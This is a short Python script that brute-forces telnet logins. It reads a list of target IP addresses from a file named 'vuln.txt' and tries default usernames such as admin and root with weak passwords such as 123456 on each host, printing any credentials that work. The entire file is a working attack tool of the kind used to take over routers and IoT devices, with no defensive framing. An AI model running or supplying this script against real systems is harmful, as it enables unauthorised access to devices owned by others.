import telnetlib
import socket


USERNAMES = ['admin', 'root', 'user']
PASSWORDS = ['password', '123456', 'admin', 'root']
IP_LIST = open('vuln.txt')


for ip in IP_LIST:
    try:
        print("Scanning IP: ", ip)
        tn = telnetlib.Telnet(ip)
        tn.read_until(b"login: ")

        
        for user in USERNAMES:
            for password in PASSWORDS:
                tn.write(user.encode('ascii') + b"\n")
                if password:
                    tn.read_until(b"Password: ")
                    tn.write(password.encode('ascii') + b"\n")

                
                result = tn.read_some()
                if b"Login incorrect" not in result:
                    print("Success! IP: {} Username: {} Password: {}".format(ip, user, password))
                    tn.close()
                    exit()  

        tn.close()  
    except Exception as e:
        print(f"Error: {e}")